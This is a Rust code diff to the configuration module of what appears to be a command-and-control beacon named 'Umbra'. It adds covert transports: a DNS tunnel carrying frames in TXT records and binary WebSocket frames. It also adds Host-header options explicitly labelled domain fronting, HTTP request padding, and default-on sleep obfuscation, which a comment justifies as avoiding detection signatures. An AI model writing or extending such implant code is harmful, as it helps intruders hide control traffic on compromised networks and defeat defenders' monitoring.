@@ -38,11 +38,39 @@ pub const COMPILED_JITTER: &str = match option_env!("UMBRA_JITTER") {
     Some(v) => v,
     None => "20",
 };
+pub const COMPILED_DNS_RESOLVER: &str = match option_env!("UMBRA_DNS_RESOLVER") {
+    Some(v) => v,
+    None => "127.0.0.1:5353",
+};
+pub const COMPILED_DNS_DOMAIN: &str = match option_env!("UMBRA_DNS_DOMAIN") {
+    Some(v) => v,
+    None => "umbra.local",
+};
+pub const COMPILED_WS_PATH: &str = match option_env!("UMBRA_WS_PATH") {
+    Some(v) => v,
+    None => "/api/v1/beacon",
+};
+pub const COMPILED_WS_HOST_HEADER: &str = match option_env!("UMBRA_WS_HOST_HEADER") {
+    Some(v) => v,
+    None => "",
+};
+pub const COMPILED_HTTP_PAD: &str = match option_env!("UMBRA_HTTP_PAD") {
+    Some(v) => v,
+    None => "0",
+};
+pub const COMPILED_HTTP_HOST_HEADER: &str = match option_env!("UMBRA_HTTP_HOST_HEADER") {
+    Some(v) => v,
+    None => "",
+};
 
 #[derive(Debug, Clone, Copy, PartialEq, Eq)]
 pub enum Transport {
     Tcp,
     Http,
+    /// The DNS tunnel: the frames travel inside TXT records.
+    Dns,
+    /// The WebSocket transport: the frames travel in binary WebSocket frames.
+    Ws,
 }
 
 #[derive(Debug, Clone)]
@@ -55,6 +83,22 @@ pub struct Config {
     pub sleep: u64,
     pub jitter: u32,
     pub verbose: bool,
+    /// The resolver that answers for the tunnel domain.
+    pub dns_resolver: String,
+    /// The domain the tunnel answers for.
+    pub dns_domain: String,
+    /// The route of the WebSocket upgrade request.
+    pub ws_path: String,
+    /// The Host header of the WebSocket upgrade request (domain fronting).
+    /// An empty value means "host:port".
+    pub ws_host_header: String,
+    /// The Host header of the HTTP requests (domain fronting). An empty
+    /// value means "host:port".
+    pub http_host_header: String,
+    /// The bucket size the HTTP request bodies are padded to (0 = off).
+    pub http_pad: u32,
+    /// Whether the beacon obfuscates its sleep interval (on by default).
+    pub sleep_obfuscate: bool,
 }
 
 fn pick(name: &str, compiled: &str) -> String {
@@ -96,7 +140,9 @@ impl Config {
         let transport = match transport_raw.as_str() {
             "tcp" => Transport::Tcp,
             "http" | "https" => Transport::Http,
-            other => return Err(format!("unknown transport {other:?} (tcp|http)")),
+            "dns" => Transport::Dns,
+            "ws" | "websocket" => Transport::Ws,
+            other => return Err(format!("unknown transport {other:?} (tcp|http|dns|ws)")),
         };
 
         let psk_raw = pick("UMBRA_PSK", COMPILED_PSK);
@@ -128,6 +174,9 @@ impl Config {
             return Err("UMBRA_JITTER must be <= 90".to_string());
         }
 
+        // Sleep obfuscation is on unless it is explicitly switched off: a
+        // beacon that checks in on a metronome is a beacon that is easy to
+        // write a signature for.
         Ok(Config {
             server: pick("UMBRA_SERVER", COMPILED_SERVER),
             transport,
@@ -137,6 +186,17 @@ impl Config {
             sleep,
             jitter,
             verbose: env::var("UMBRA_VERBOSE").map(|v| v == "1").unwrap_or(false),
+            dns_resolver: pick("UMBRA_DNS_RESOLVER", COMPILED_DNS_RESOLVER),
+            dns_domain: pick("UMBRA_DNS_DOMAIN", COMPILED_DNS_DOMAIN),
+            ws_path: pick("UMBRA_WS_PATH", COMPILED_WS_PATH),
+            ws_host_header: pick("UMBRA_WS_HOST_HEADER", COMPILED_WS_HOST_HEADER),
+            http_host_header: pick("UMBRA_HTTP_HOST_HEADER", COMPILED_HTTP_HOST_HEADER),
+            http_pad: pick("UMBRA_HTTP_PAD", COMPILED_HTTP_PAD)
+                .parse::<u32>()
+                .map_err(|_| "UMBRA_HTTP_PAD must be an integer".to_string())?,
+            sleep_obfuscate: env::var("UMBRA_SLEEP_OBFUSCATE")
+                .map(|v| v != "0" && v.to_lowercase() != "false")
+                .unwrap_or(true),
         })
     }
 }
